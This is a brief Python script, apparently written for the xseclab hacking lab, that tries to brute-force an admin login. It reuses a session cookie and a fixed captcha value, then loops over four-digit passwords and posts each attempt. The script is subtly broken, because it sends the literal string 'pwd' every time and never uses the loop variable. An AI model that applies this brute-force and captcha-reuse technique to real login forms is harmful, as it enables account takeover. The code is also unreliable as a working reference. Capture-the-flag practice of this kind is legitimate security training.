#-*- coding:utf-8 -*-
import requests
import chardet
s = requests.Session()
url = 'http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/index.php'
header = {
    'Cookie' : 'PHPSESSID=da97e3ffaf9580288da639a20d9fb0b3'
}
for pwd in range(1000,10000):
    payload = {
        'username' : 'admin','pwd' : 'pwd','vcode' : '1234'
    }
    r = s.post(url,headers=header,data=payload).text
    print(r)